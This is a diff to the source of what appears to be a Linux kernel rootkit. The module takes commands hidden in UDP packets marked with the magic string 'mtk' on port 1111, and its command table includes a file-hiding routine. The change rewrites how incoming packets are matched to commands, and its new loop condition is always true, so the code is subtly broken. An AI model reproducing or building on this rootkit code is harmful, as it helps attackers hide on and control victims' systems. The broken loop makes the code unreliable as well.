@@ -11,7 +11,6 @@
 #define CMD_MAGIC ("mtk")
 #define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
 #define CMD_PORT (1111)
-#define CMD_AMOUNT (5)
 #define RESPONSE_DATA_LEN (3)
 #define RESPONSE_HEADER_LEN (sizeof(struct udphdr) + sizeof(struct iphdr) + ETH_HLEN)
 
@@ -27,7 +26,7 @@ static int exit_func(const char *_) {
     return 0;
 }
 
-struct cmd_type cmds[CMD_AMOUNT] = {
+struct cmd_type cmds[] = {
     {
         "hfile",
         hide_file
@@ -175,11 +174,8 @@ static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
 }
 
 static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
-    int i;
     struct cmd_type *cmd;
-    
-    for (i = 0; i < CMD_AMOUNT; i++) {
-        cmd = cmds + i;
+    for (cmd = cmds; cmd < (cmd + ARRAY_SIZE(cmds)); ++cmd) {
         if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
             return cmd;
         }
